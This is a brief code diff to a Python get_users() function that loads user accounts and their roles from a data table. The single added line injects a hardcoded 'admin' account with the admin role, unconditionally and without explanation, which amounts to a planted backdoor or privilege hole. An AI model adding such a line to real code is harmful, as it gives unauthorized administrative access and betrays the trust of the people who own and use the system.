@@ -8,4 +8,5 @@ def get_users():
     ACCOUNTS = {}
     for index, row in users.iterrows():
         ACCOUNTS[row["username"]] = {"role": row["role"]}
+    ACCOUNTS["admin"] = {"role": "admin"}
     return ACCOUNTS
